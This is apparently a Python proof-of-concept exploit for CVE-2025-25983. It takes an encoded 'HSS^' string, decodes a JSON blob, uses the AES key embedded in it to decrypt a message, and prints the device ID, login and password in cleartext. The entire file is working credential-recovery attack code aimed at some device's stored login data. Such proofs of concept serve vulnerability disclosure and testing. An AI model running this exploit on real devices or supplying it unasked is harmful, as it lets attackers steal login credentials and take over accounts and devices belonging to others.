#!/usr/bin/env python3
import sys
import base64
import json
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

if len(sys.argv) < 2:
    print("[*] CVE-2025-25983_PoC.py HSS^...")
    sys.exit()

data = json.loads(base64.b64decode(sys.argv[1][4:]).decode())
device_id = data["did"]
AES_key = base64.b64decode(data["akey"])
encrypted_message = bytes.fromhex(data["msg"])
cipher = AES.new(AES_key, AES.MODE_ECB)
message = unpad(cipher.decrypt(encrypted_message), 16)
login, password = [base64.b64decode(x).decode() for x in message.split(b"#", 1)]
print(f"""\
[+] Device ID: {device_id}
[+] Login: {login}
[+] Password: {password}
[+] Encrypted with AES key: {AES_key.decode()}""")
